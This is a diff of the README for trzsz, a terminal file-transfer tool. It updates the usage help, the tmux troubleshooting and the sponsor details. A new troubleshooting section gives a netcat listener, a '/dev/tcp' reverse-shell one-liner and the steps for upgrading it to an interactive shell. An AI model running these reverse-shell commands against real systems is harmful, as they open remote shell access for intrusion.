-  Send file(s), similar to sz and compatible with tmux.
+```
+usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  positional arguments:
-    file               file(s) to be sent
+Send file(s), similar to sz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  file               file(s) to be sent
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### Trouble shooting
-* If `tmux` is not running on the remote server, but on the local computer, or on a middle server.
-  * Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
-  * Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, and `alias ssh="trzsz ssh"` for convenience.
-
-* If an error occurs, and `trzsz` is hanging up.
-  * Press `control + c` to stop `trz` or `tsz` process on the server.
-  * For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
 
-* If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
-  * Try to escape all known control characters, e.g., `trz -eb`.
+- If `tmux` is running on the local computer.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, use `trzsz ssh` to login after `tmux`.
+
+- If `tmux` is running on the jump server.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the jump server, use `trzsz -r ssh` to login after `tmux`.
+
+- If an error occurs, and `trzsz` is hanging up.
+
+  - Press `control + c` to stop `trz` or `tsz` process on the server.
+  - For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
+
+- If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
+
+  - Try to escape all known control characters, e.g., `trz -eb`.
 
-* If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
-  * Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
+- If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
+
+  - Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
     ```
     #!/bin/sh
     export LC_CTYPE=C
     expect -c '
       spawn ssh xxx
       expect "xxx: "
       send "xxx\n"
       interact
     '
     ```
 
+- If you want to upload and download using `trz / tsz` in a reverse shell, you need to follow these steps:
+
+  - 1\. Use `tssh xxx` or `trzsz ssh xxx` to log in to the server.
+  - 2\. Execute `nc -lnv 1337` on the server, and wait for the reverse shell connection.
+  - 3\. Reverse connect to the server on the target, such as `bash -i >& /dev/tcp/192.168.0.1/1337 0>&1`.
+  - 4\. Follow these steps in the reverse shell:
+    - 4.1. Convert to an interactive shell, such as `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+    - 4.2. Press `ctrl + z` to turn the reverse shell into background.
+    - 4.3. Execute `stty raw -echo; fg` to disable the echo of the server, and return to the reverse shell.
+    - 4.4. Press the Enter key, and the command line prompt will be displayed.
+    - 4.5. Set the terminal environment variable `export TERM=xterm-256color` ( not necessary ).
+    - 4.6. Check if there is a `TMUX` environment variable, clear it with `unset TMUX`.
+    - 4.7. Now you can use `trz / tsz` to upload and download as normal.
+  - 5\. After exiting the interactive shell, there will be no echo, type `exit` blindly to exit the reverse shell.
+  - 6\. Type `reset` blindly on the server and press Enter to reset the default settings of the terminal.
+
 ## Screenshot
 
 #### Using trzsz in iTerm2 with `text` progress bar
 
-  ![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
-
+![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
 
 #### Using trzsz in iTerm2 with `zenity` progress bar
 
-  ![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
-
+![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
 
 #### Using trzsz in tabby with `tabby-trzsz` plugin
 
-  ![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
-
+![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
 
 ## Contact
 
-Feel free to email me <lonnywong@qq.com>.
+Feel free to email the author <lonnywong@qq.com>. Welcome to join the QQ group: 318578930.
+
+Want to buy the author a drink 🍺 ?
+
+![sponsor wechat qrcode](https://trzsz.github.io/images/sponsor_wechat.jpg)
+![sponsor alipay qrcode](https://trzsz.github.io/images/sponsor_alipay.jpg)
```

